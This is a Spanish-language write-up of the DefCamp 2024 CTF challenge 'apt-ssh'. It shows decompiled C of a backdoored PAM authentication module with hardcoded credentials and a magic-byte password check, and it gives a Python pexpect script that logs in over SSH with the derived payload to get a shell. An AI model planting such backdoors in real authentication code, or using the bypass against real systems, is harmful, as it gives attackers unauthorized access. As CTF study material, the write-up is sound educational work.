---
layout: post
title: apt-ssh DefCamp 2024
comments: true
categories: [Pwn, Writeups, DefCamp]
---

Este es un reto de la competición de CTF DefCamp 2024, organizada por [DefCamp](https://www.linkedin.com/company/defcamp/?originalSubdomain=es). Este fue uno de los 4 retos de la categoría de PWN, de categoría *easy*.

![Image]({{ site.baseurl }}/images/posts/2024-10-1-Buy-coffee-DefCamp24-CTF-Logo.png)

# Overview

Este reto consistía en una aplicación PAM con una *backdoor* que spawneaba una shell en caso de que la contraseña cumpliera ciertos requisitos. 

# Reconocimiento

Se nos da únicamente una conexión por **SSH** (IP:puerto y credenciales), al conectarnos, se nos imprimen dos archivos encodeados en *base64*, en [cyberchef](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&input=WTI5dVptazZaR1Z1ZEdsaGJBPT0&oeol=CR) podemos convertirlo en dos archivos. Uno de ellos, es el que supuestamente tiene una *backdoor*. Podemos inspeccionar con *ghidra*:

```c
undefined4 pam_sm_authenticate(undefined8 param_1)
{
  int iVar2;
  size_t sVar3;
  FILE *__stream;
  char *pcVar4;
  undefined2 local_112;
  char *local_110;
  char *local_108;
  undefined4 local_100;
  undefined2 local_fc;
  undefined2 local_fa;
  undefined local_f8 [16];
  undefined local_e8 [16];
  undefined local_d8 [16];
  undefined local_c8 [16];
  undefined local_b8 [16];
  undefined local_a8 [16];
  undefined4 local_98;
  undefined local_88 [120];
  undefined auVar1 [16];
  
  rand();
  local_98 = 0;
  local_f8 = (undefined  [16])0x0;
  local_e8 = (undefined  [16])0x0;
  local_d8 = (undefined  [16])0x0;
  local_c8 = (undefined  [16])0x0;
  local_b8 = (undefined  [16])0x0;
  local_a8 = (undefined  [16])0x0;
  iVar2 = dfgebrycw();
  if (iVar2 == 0) {
    iVar2 = pam_get_user(param_1,&local_110,"Username: ");
    if (iVar2 == 0) {
      iVar2 = pam_get_authtok(param_1,6,&local_108,0);
      if (iVar2 != 0) {
        return 7;
      }
      iVar2 = dfgebrycw();
      if (iVar2 != 0) {
        return 7;
      }
      send_debug_message(param_1,local_88);
	      iVar2 = strcmp(local_108,"aptssh");                           /*COMPARACION PARA aptssh:aptssh*/
      if (iVar2 == 0) {
        iVar2 = strcmp(local_110,"aptssh");
        if (iVar2 == 0) {
          output_base64_file(param_1,"/lib/security/pam_passfile.so");
          output_base64_file(param_1,"/pam_passfile.o");
          return 0;
        }
      }
      else {                                                           /*COMPARACION ALTERNATIVA*/
        iVar2 = ierubvhcjsx();
        if (iVar2 == 0) {
          iVar2 = dfgebrycw();
          if (iVar2 != 0) {
            return 7;
          }
          pam_casual_auth(&local_112);
          sVar3 = strlen(local_108);
          if (100 < sVar3) {                             /*COMPARA LA LONGITUD DE LA CONTRASEÑA*/
            iVar2 = 7000;
            do {
              iVar2 = iVar2 + -8;
            } while (iVar2 != 0);
            local_100 = 0xadc29ec3;
            local_fa = 0xafc3;
            local_fc = local_112;
            auVar1[0xf] = 0;
            auVar1._0_15_ = local_f8._1_15_;
            local_f8 = auVar1 << 8;
            iVar2 = memcmp(local_108 + 100,&local_100,9);  /*COMPARA A PARTIR DEL CARACTER 100 DE LA CONTRASEÑA*/
            if (iVar2 == 0) {
              iVar2 = 10000;
              do {
                iVar2 = iVar2 + -8;
              } while (iVar2 != 0);
              return 0;
            }
          }
          iVar2 = ierubvhcjsx();
          if (iVar2 == 0) {
            __strcpy_chk(local_f8,local_108,100);
            iVar2 = strcmp(local_110,"sshuser");
            if (iVar2 == 0) {
              __stream = fopen("/home/sshuser/pass.txt","r");
              if (__stream == (FILE *)0x0) {
                return 7;
              }
              pcVar4 = fgets(local_f8,100,__stream);
              if (pcVar4 != (char *)0x0) {
                fclose(__stream);
                sVar3 = strcspn(local_f8,"\n");
                local_f8[sVar3] = 0;
                iVar2 = strcmp(local_108,local_f8);
                if (iVar2 != 0) {
                  return 7;
                }
                return 0;
              }
              fclose(__stream);
              iVar2 = 10000;
              do {
                iVar2 = iVar2 + -8;
              } while (iVar2 != 0);
              return 7;
            }
            iVar2 = 10000;
            do {
              iVar2 = iVar2 + -8;
            } while (iVar2 != 0);
          }
        }
      }
    }
  }
  else {
    iVar2 = 10000;
    do {
      iVar2 = iVar2 + -8;
    } while (iVar2 != 0);
  }
  return 10;
}
```

Aquí vemos dos comparaciones principales, la primera, en caso de utilizar las credenciales `aptssh:aptssh`, que nos dará los archivos que tenemos. Además, vemos que en caso de un login correcto, tenemos un código de estado `0` (`return 0;`).

En la segunda comparación, se comprueba que la longitud de la contraseña sea mayor de 100. Después, se comprueban los carácteres a partir de la posición 100:

```c
if (100 < sVar3) {    /*COMPARA LA LONGITUD DE LA CONTRASEÑA*/
	
	iVar2 = 7000;
	do {
	  iVar2 = iVar2 + -8;
	} while (iVar2 != 0);    /*DELAY*/
	
	local_100 = 0xadc29ec3;
	local_fa = 0xafc3;
	local_fc = local_112;
	auVar1[0xf] = 0;
	auVar1._0_15_ = local_f8._1_15_;
	local_f8 = auVar1 << 8;
	iVar2 = memcmp(local_108 + 100,&local_100,9);  /*COMPARA A PARTIR DEL CARACTER 100 DE LA CONTRASEÑA*/
	if (iVar2 == 0) {
	  iVar2 = 10000;
	  do {
		iVar2 = iVar2 + -8;
	  } while (iVar2 != 0);
	  return 0;
	}
  }
```

Vemos que se comparan 9 bytes del dirección a la que apunta `local_100`, sin embargo, sólo contiene 4 (`0xadc29ec3`). Por tanto, seguirá leyendo las posiciones adyacentes:

```c
undefined4 local_100;
undefined2 local_fc;
undefined2 local_fa;
undefined local_f8 [16];
```

Por tanto, debemos pasar los valores que contendrán dichas variables: `local_100 (4B) + local_fc (2B) + local_fa (2B) + local_f8 (1B)`

```c
void pam_casual_auth(undefined2 *param_1) {
  *param_1 = 0xbec2;
  return;
}
```
> `local_112` se asigna mediante esta función.

# Explotación

De esta forma nos queda un payload como: `100*A + 0xadc29ec3 + 0xbec2 + 0xafc3 + 0x00`. Ya podemos crear un script de *python*, teniendo en cuenta que debemos mandar cada valor en *Little-Endian*:

```python
import pexpect

ssh_host = "34.159.156.124"
ssh_port = 32487
username = "sshuser"
payload = (
    b"a" * 100 +
    b"\xc3\x9e\xc2\xad\xc2\xbe\xc3\xaf"
)

child = pexpect.spawn(f"ssh -p {ssh_port} {username}@{ssh_host}")
child.expect("d:")
child.sendline(payload)
print(child.before.decode("utf-8"))
child.interact()
```

Este es un script creado por [r0-dev-null](https://github.com/r0-dev-null/ctf-writeups/tree/main/DCTF%202024%20Quals), ya que genera una shell más estable de la que logré con pwntools.

El reto en sí no creo que deba categorizarse como PWN sino como reversing, ya que no se ataca una vulnerabilidad de un programa como tal, sino que se resuelve mediante la aplocación de ingeniería inversa al binario.